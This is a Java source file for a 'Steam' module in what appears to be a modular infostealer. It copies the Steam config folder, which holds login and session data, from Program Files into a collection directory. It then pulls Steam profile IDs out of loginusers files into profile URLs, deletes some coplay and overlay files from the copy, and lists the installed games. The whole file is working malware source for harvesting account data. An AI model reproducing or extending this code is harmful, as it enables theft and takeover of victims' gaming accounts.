package _256.node.nodes.impl.app;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.io.FileUtils;

import _256.node.Category;
import _256.node.Node;

public class Steam extends Node {

	public Steam() {
		super(Category.FILE);
	}

	@Override
	public void createNode() {
		File logged_accs = new File(System.getenv("ProgramFiles(X86)") + "\\Steam\\" + "config\\");
		if (logged_accs.exists()) {
			try {
				FileUtils.copyDirectory(logged_accs, mergePath(getFolder(), "Steam"));
				FileWriter writer = new FileWriter(getFolder() + "\\steam\\" + "Log_Info.txt");
				BufferedWriter bufferedWriter = new BufferedWriter(writer);
				bufferedWriter.write("Logged accounts:");
				bufferedWriter.newLine();
				for (File file : Objects.requireNonNull(logged_accs.listFiles())) {
					if (file.getName().contains("loginusers")) {
						String fileContent = FileUtils.readFileToString(file);
						final String regex = "\\b\\w{17}\\b";
						final Pattern pattern = Pattern.compile(regex, Pattern.MULTILINE);
						final Matcher matcher = pattern.matcher(fileContent);
						while (matcher.find()) {
							bufferedWriter.write("http://steamcommunity.com/profiles/" + matcher.group(0) + "\n");
						}
					}
				}
				for (File file2 : Objects.requireNonNull(logged_accs.listFiles())) {
					if (file2.getName().contains("coplay_")) {
						file2.delete();
					} else if (file2.getName().contains("DialogConfigOverlay")) {
						file2.delete();
					}
				}
				bufferedWriter.newLine();
				bufferedWriter.write("Installed games:");
				bufferedWriter.newLine();
				File installed_games = new File(System.getenv("ProgramFiles(X86)") + "\\Steam\\" + "steamapps\\");
				for (File file : Objects.requireNonNull(installed_games.listFiles())) {
					if (file.getName().contains("appmanifest_")) {
						String fileContent = FileUtils.readFileToString(file);
						for (String str : fileContent.split("\n")) {
							if (str.contains("\"name\"")) {
								String cleaned = str.replace("\"name\"", "").replace("\t", "").replace("\"", "");
								bufferedWriter.write(cleaned + "\n");
							}
						}
					}
				}
				bufferedWriter.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}